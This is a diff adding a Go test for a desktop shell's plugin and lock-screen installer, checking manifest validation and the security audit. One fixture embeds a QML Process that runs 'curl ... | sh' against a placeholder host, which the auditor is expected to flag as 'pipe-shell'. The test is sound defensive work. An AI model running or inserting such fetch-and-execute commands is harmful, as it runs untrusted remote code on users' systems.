@@ -355,6 +355,40 @@ Item {
 	}
 }
 
+// Launcher plugins and lock screens go through the same audited, fresh-folder
+// install as widgets, each with its own manifest.
+func TestPluginAndLockscreenInstall(t *testing.T) {
+	h, c, tmp := setup(t)
+	for _, k := range []struct{ typ, mf string }{{"plugins", "plugin.json"}, {"lockscreens", "lockscreen.json"}} {
+		bad := targz(t, tarEnt{name: "widget.json", body: `{"name":"X"}`}, tarEnt{name: "Main.qml", body: "Item {}"})
+		c.put(Entry{ID: "x", Type: k.typ, Version: "1"}, bad, bad)
+		h.Refresh("")
+		if _, err := h.Prepare(k.typ, "x", ""); err == nil || !strings.Contains(err.Error(), k.mf) {
+			t.Fatalf("%s without %s: %v", k.typ, k.mf, err)
+		}
+		a := targz(t, tarEnt{name: k.mf, body: `{"id":"x","name":"X"}`},
+			tarEnt{name: "Main.qml", body: `Item { Process { command: ["sh", "-c", "curl -s https://e.example/a | sh"] } }`})
+		c.put(Entry{ID: "x", Type: k.typ, Version: "1"}, a, a)
+		h.Refresh("")
+		p, err := h.Prepare(k.typ, "x", "")
+		if err != nil || !p.Code || !slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == "pipe-shell" }) {
+			t.Fatalf("%s prepare: %+v %v", k.typ, p, err)
+		}
+		path, err := h.Commit(p.Token)
+		if err != nil || path != filepath.Join(tmp, ".config/anoshell", k.typ, "x~1") {
+			t.Fatalf("%s commit %s %v", k.typ, path, err)
+		}
+		res, _ := h.List(k.typ)
+		if !slices.ContainsFunc(res.Items, func(it Item) bool { return it.ID == "x" && it.Source == "installed" && it.Code }) {
+			t.Fatalf("%s list %+v", k.typ, res.Items)
+		}
+	}
+	res, _ := h.List("lockscreens")
+	if !slices.ContainsFunc(res.Items, func(it Item) bool { return it.ID == "default" && it.Source == "builtin" }) {
+		t.Fatalf("no built-in lock screen: %+v", res.Items)
+	}
+}
+
 func readTree(t *testing.T, root string) map[string]string {
 	out := map[string]string{}
 	filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
